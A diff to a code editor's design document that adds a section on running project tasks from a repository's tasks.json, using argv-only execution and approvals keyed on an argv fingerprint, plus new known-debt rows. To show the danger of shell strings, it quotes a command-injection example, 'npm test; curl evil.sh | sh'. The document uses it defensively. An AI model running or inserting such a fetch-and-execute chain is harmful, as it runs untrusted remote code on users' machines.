@@ -113,6 +113,7 @@ src/
 │  ├─ diff.ts            Myers line diff; hunks for review and Git
 │  ├─ git-status.ts      Porcelain v2 → branch, staged/unstaged, renames
 │  ├─ git-blame.ts       Blame porcelain → a commit per line, and its label
+│  ├─ tasks.ts           tasks.json → tasks, and the argv an approval keys on
 │  ├─ replace.ts         Replacement computation and expansion
 │  ├─ languages.ts       Language identity (no parsers)
 │  ├─ symbols.ts         Named structure in a file, read from a parse tree
@@ -150,6 +151,8 @@ src/
 │  ├─ watcher.ts         Reacts to changes made outside Nox
 │  ├─ session.ts         Restore folder, tabs, cursors and unsaved work
 │  ├─ notes.ts           The user's own notes. No workspace, by construction.
+│  ├─ tasks.ts           The project's own commands. Two files, and only one
+│  │                     of them runs without being asked about
 │  ├─ ui.ts              Overlay/focus state; owns "what does Escape close"
 │  ├─ notifications.ts   Toasts
 │  ├─ search.ts          Project search: query, options, streamed results
@@ -2536,6 +2539,81 @@ lazy activation declared contributions exist to protect.
 
 ---
 
+### A task from a repository is argv, and is asked about by its argv
+
+Every other config reader in Nox could refuse this problem. Tasks could not.
+
+`.nox/settings.json` arrives with a cloned repository, so its schema carries an
+eight-key **allowlist** and `config/schema.ts:20-29` names the reason:
+"never anything naming a program, a path or an address. `terminal.shell` is the
+reason this list exists." Plugin settings took the same line and paid for it
+with a Known debt row, "A project cannot configure a plugin", because Nox
+cannot tell an author's `margin.width` from their `formatter.path`. Both refuse
+the whole class of key rather than trying to judge one.
+
+A `tasks.json` in a repository *is* that class of key. The row in ROADMAP is
+"run **project** commands", so refusing it would have been dropping the row.
+
+**What resolves it is not what the file names but when the naming takes
+effect.** `terminal.shell` from a repository is dangerous because it applies
+the moment you open a terminal, invisibly, having been read by nobody. A task
+does nothing until a person asks for it by name, and that gives Nox a moment,
+before anything runs, to show exactly what is about to happen. Consent has
+somewhere to go. Two decisions make that moment worth anything.
+
+**argv, never a shell.** A task is a `command` and an `args` array; nothing
+reaches `sh -c`, and there is no string form that gets split. This follows
+`AgentProcessSpec`, `LanguageServerSpec` and `git.rs`'s "argv-fixed, never a
+shell", so it is the house rule rather than a new one, but here it is load
+bearing rather than tidy. With a shell string the dialog would print text that
+a shell then *reinterprets*: `npm test; curl evil.sh | sh` reads as a test run
+at a glance, and quoting, expansion, substitution and globbing all get their
+say after the click. With argv there is no second reader, and what the dialog
+prints is what `execve` receives, element for element. A confirmation you
+cannot fully trust is worse than none, because it launders the thing it was
+supposed to check. The cost is real and is not hidden: `npm test && npm run
+lint` is two tasks, a pipeline is not a task at all, and the terminal is one
+chord away and is a shell on purpose.
+
+**The approval is keyed on the argv, not the task's name.** This is the half
+that is easy to get wrong, because keying on the id is the obvious
+implementation and reads fine. It would let a repository earn a yes for
+`test` meaning `npm test`, then change the file (a pull, a branch switch, the
+watcher-driven reload two paragraphs down, none of which anyone is looking at)
+and inherit the approval for something else under a name already trusted.
+Fingerprinting `command` and `args` joined with NUL makes any edit to what a
+task runs a new question, and NUL is the separator because it is the one byte
+an argv element cannot hold, so two distinct argvs cannot collide by
+construction rather than by being unlikely to. `tests/tasks.test.ts` pins it:
+swapping `taskFingerprint(task)` for `task.id` leaves nineteen of its twenty
+tests green and fails exactly that one.
+
+Trust is session-scoped and never written to disk, the granularity
+`PermissionService` already offers for "allow for this session", and it is
+listed in the panel and dropped by **Forget Approved Tasks** because a grant
+you cannot see is a grant you cannot withdraw.
+
+**The gate is the service's, not `PermissionService`'s.** That was the obvious
+home and it is the wrong one. `commands.ts:200` guards only when
+`principal.kind !== 'user'`, and `AGENT-PLATFORM.md:265` argues the exemption
+rather than assuming it: a model that can interrupt a human mid-keystroke is
+one they turn off within a day. So the permission model answers "may this agent
+make Nox do something". The question here is the other one, and the principal
+is the user in both readings of it. `shell.exec` keeps its meaning and its
+`deny` default, the task commands declare it so an agent asking for one is
+refused exactly as before, and the user's own protection is a smaller thing
+that lives in `TaskService`.
+
+Two consequences worth having written down. The user's `tasks.json` is routed
+through `classifyConfigChange` and live-reloads, unlike `servers.json` and
+`agents.json`, and the line is that re-reading it **starts nothing**: it
+changes which commands are listed, and running one is still an act. Nor can a
+reload launder an approval, precisely because trust is argv-keyed. And
+`tasks.edit` creates the *user's* file only. Nox offering to author a
+`.nox/tasks.json` would be Nox helping to write the file the confirmation
+exists to catch, and an editor that offers to create it teaches that the file
+is ordinary.
+
 ### Completion sources are registered, never overridden
 
 `autocompletion()` takes an `override` option, and using it was a defect that
@@ -2630,6 +2708,11 @@ Recorded rather than hidden. Each is a deliberate MVP trade.
 |---|---|
 | Nine defensive initialisers are dead assignments | `no-useless-assignment` is right that the `let x = <value>` opening a `try` in `config/index.ts`, `keymap.ts`, `session.ts`, `updates.ts`, `watcher.ts` and `workspace.ts` is never read, because every path that reaches a use overwrites it first. It is also the thing that stops TypeScript reporting a read before assignment on the early-return paths, so removing it is a change to what the compiler checks, not a tidy-up. Left at warning level in `eslint.config.js` rather than fixed in passing, because three of the nine are in `workspace.ts`, which owns unsaved work. |
 | Quick-open's cost is bounded by a cap rather than by the algorithm | The scan is linear in the index and the index is the whole project, so what keeps it inside a frame is `INDEX_MAX_FILES` (14,000, measured, see `filetree.ts`) and the 4,000-survivor break in `fileRows`, not anything about the matcher. Worst realistic query at the cap is ~10 ms of 16 ms. Two consequences worth knowing: a workspace larger than the cap has files quick-open can never find, and the survivor break means `total` is a lower bound and a perfect match late in index order can be missed on a dense query. Removing both needs the scan to become interruptible, chunked across frames, which makes the palette's result path async. |
+| Task output is not windowed either | The same row as Problems and References below, and the tasks panel joins them rather than solving it: 5,000 lines of `<div>` is more than either of those will realistically hold. What keeps it survivable is the cap and the 50 ms coalesce, so the DOM is bounded and the repaint rate is bounded, but a task at the cap is 5,000 elements. It is the third caller now, which is the point at which "re-decide on their own merits" starts to look like one shared decision. |
+| Task trust does not survive a restart | Deliberate, and the same granularity `PermissionService`'s "allow for this session" has: a grant that outlives the window it was given in is a grant nobody remembers giving. The cost is a repeat question once per session per project task, which is the right price for a first version and the wrong one if someone runs Nox all day across several repositories. Persisting it is a feature rather than a flag: it needs a scope (this argv, in this repository), a viewer, and a way to withdraw one entry, and none of those exist. |
+| A fifth panel in the editor slot costs a line in each of the other four | `showAgents`, `showDiff`, `showWelcome` and now `showTasks` each clear the other three by name, so the slot is N-by-N and this change is where it stopped being small. `dismissTop` and `hasDismissible` have the same shape. One `editorLayer: Signal<'review' \| 'agents' \| 'diff' \| 'tasks' \| null>` would collapse all of it, and it is a refactor of four shipped panels rather than something to do while adding the fifth. `tests/overlay-routing.test.ts` covers the overlays and nothing covers this slot, which is the part that would want writing first. |
+| Tasks would rather be a bottom panel than an editor one | It takes over the editor area because that is where the width is (`ui.ts:161-164` made the same argument for the agents panel), and watching a build fail *beside* the code that failed is `terminalOpen`'s own argument for sitting below instead. There is no bottom-panel container: `App.svelte` renders `TerminalPanel` and nothing else, with no tab strip and no second slot. Building one is a layout feature, and doing it as a side effect of the tasks row would have made a change about running commands into a change about how panels stack. |
+| `agentProcesses` now gates more than agents | `TaskService.available` reads `platform.capabilities.agentProcesses`, because "can this build start a child process" is exactly the question and there is one flag for it. The name is narrower than what it gates: plugins with a `process` transport already borrowed the same method, and tasks are the third caller. Renaming the flag touches `types.ts`, `memory.ts`, `web.ts`, `tauri.ts` and every capability test for no behaviour change, so it is recorded rather than done. |
 | Problems and References are not windowed | They share the flat-row shape the explorer and search now window (see §4), but their natural limits are lower. Re-decide on their own merits rather than inheriting the explorer spec's out-of-scope line. |
 | Commit is enabled while a merge conflict is unresolved | The panel names conflicts and refuses to stage them, but the Commit button does not know about them. Real git refuses ("committing is not possible because you have unmerged files") and the refusal surfaces through the existing error path, so the outcome is correct and merely late. `MemoryPlatform.gitCommit` does not model the refusal, so nothing tests it. |
 | `undoSession` still revokes grants as a side effect | Revocation is its own command now (`permissions.revokeGrants`), so undoing an agent's *work* arguably should leave its *permissions* alone. The two are still welded in `agent/runtime.ts`; the panel's toast says so rather than surprising the user. |
